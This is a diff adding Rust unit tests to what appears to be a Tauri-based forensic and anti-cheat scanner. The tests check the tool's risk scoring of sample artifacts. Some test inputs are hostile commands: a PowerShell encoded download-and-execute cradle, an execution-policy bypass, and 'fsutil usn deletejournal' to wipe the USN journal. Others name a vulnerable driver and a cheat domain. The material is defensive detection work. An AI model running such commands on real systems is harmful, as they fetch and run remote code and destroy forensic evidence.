@@ -1385,3 +1385,130 @@ pub fn run() {
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::time::Instant;
+    use tauri::async_runtime::block_on;
+
+    const TOOL_IDS: [&str; 17] = [
+        "autoruns-plus-plus", "string-explorer-plus-plus", "moss-2-0", "win-prefetch-view-plus-plus",
+        "usb-deview-plus-plus", "saved-files-viewer-plus-plus", "power-shell-parser-plus-plus",
+        "paths-parser-plus-plus", "mft-explorer-plus-plus", "kernel-live-dump-plus-plus",
+        "journal-trace-plus-plus", "crashed-file-viewer-plus-plus", "browsing-history-view-plus-plus",
+        "browser-downloads-view-plus-plus", "bam-parser-plus-plus", "amcache-parser-plus-plus",
+        "srum-explorer-plus-plus",
+    ];
+
+    fn eval(kind: &str, input: &str) -> CustomEvaluationResult {
+        block_on(evaluate_custom_artifact(kind.to_string(), input.to_string())).unwrap()
+    }
+
+    #[test]
+    fn powershell_encoded_download_cradle_is_high() {
+        let r = eval("powershell_cmd", "powershell -enc AAAA; IEX (New-Object Net.WebClient).DownloadString('http://x')");
+        assert_eq!(r.risk_level, "High");
+        assert!(r.matched_rules.len() >= 3);
+    }
+
+    #[test]
+    fn powershell_bypass_only_is_medium() {
+        assert_eq!(eval("powershell_cmd", "powershell -ExecutionPolicy Bypass -File a.ps1").risk_level, "Medium");
+    }
+
+    #[test]
+    fn powershell_benign_is_low() {
+        assert_eq!(eval("powershell_cmd", r"Get-ChildItem C:\Users").risk_level, "Low");
+    }
+
+    #[test]
+    fn dns_known_cheat_domain_is_high() {
+        assert_eq!(eval("dns_domain", "auth.eulen.gg").risk_level, "High");
+    }
+
+    #[test]
+    fn dns_risky_tld_is_medium() {
+        assert_eq!(eval("dns_domain", "example.ru").risk_level, "Medium");
+    }
+
+    #[test]
+    fn dns_benign_is_low() {
+        assert_eq!(eval("dns_domain", "www.google.com").risk_level, "Low");
+    }
+
+    #[test]
+    fn driver_byovd_is_high() {
+        assert_eq!(eval("driver_service", "gdrv.sys").risk_level, "High");
+    }
+
+    #[test]
+    fn driver_benign_is_low() {
+        assert_eq!(eval("driver_service", "ntfs.sys").risk_level, "Low");
+    }
+
+    #[test]
+    fn generic_cheat_keyword_is_high() {
+        assert_eq!(eval("file_path", r"C:\Users\a\Desktop\spoofer.exe").risk_level, "High");
+    }
+
+    #[test]
+    fn generic_usn_delete_is_high() {
+        assert_eq!(eval("file_path", "fsutil usn deletejournal /d c:").risk_level, "High");
+    }
+
+    #[test]
+    fn input_is_trimmed_and_empty_is_low() {
+        assert_eq!(eval("file_path", "   ").risk_level, "Low");
+        assert_eq!(eval("file_path", "  notepad.exe  ").input_data, "notepad.exe");
+    }
+
+    // Known weak spots: plain substring matching causes false positives on benign input.
+    #[test]
+    fn false_positive_probe_substrings() {
+        let cases = [
+            ("driver_service", "genericaudio.sys", "ene"),
+            ("file_path", r"C:\Program Files\Steam\steam.exe", "esp"),
+            ("file_path", r"C:\Windows\System32\CCleaner\ccleaner.exe", "cleaner"),
+            ("powershell_cmd", "Get-Process | Where-Object {$_.Name -like 'wget*'}", "wget"),
+            ("powershell_cmd", "Write-Host 'Print the weekly report'", "iwr/iex substring"),
+        ];
+        for (k, i, why) in cases {
+            let r = eval(k, i);
+            println!("FP_PROBE [{}] '{}' -> {} ({})", k, i, r.risk_level, why);
+        }
+    }
+
+    #[test]
+    fn unknown_tool_does_not_panic() {
+        let r = block_on(run_forensic_scan("no-such-tool".into(), None));
+        println!("UNKNOWN_TOOL -> {:?}", r.as_ref().map(|o| o.summary_message.clone()));
+    }
+
+    #[test]
+    fn every_tool_scan_runs_and_counts_are_consistent() {
+        for id in TOOL_IDS {
+            let t = Instant::now();
+            let out = block_on(run_forensic_scan(id.to_string(), None))
+                .unwrap_or_else(|e| panic!("{id} returned Err: {e}"));
+            let susp = out.records.iter().filter(|r| r.risk_level != "Low").count();
+            println!(
+                "SCAN {:<34} {:>6} ms  total={:<5} susp={:<4} records={:<5} | {}",
+                id, t.elapsed().as_millis(), out.total_items, out.suspicious_count, out.records.len(), out.summary_message
+            );
+            assert_eq!(out.tool_id, id);
+            assert!(out.suspicious_count <= out.total_items.max(out.records.len()), "{id}: suspicious > total");
+            let _ = susp;
+        }
+    }
+
+    #[test]
+    fn full_audit_aggregates() {
+        let t = Instant::now();
+        let rep = block_on(run_all_forensic_scans()).unwrap();
+        println!("FULL_AUDIT {} ms tools={} artifacts={} suspicious={}",
+            t.elapsed().as_millis(), rep.total_tools_scanned, rep.total_artifacts_analyzed, rep.total_suspicious_flagged);
+        assert_eq!(rep.total_tools_scanned, TOOL_IDS.len());
+        assert_eq!(rep.total_artifacts_analyzed, rep.modules_results.iter().map(|m| m.total_items).sum::<usize>());
+    }
+}
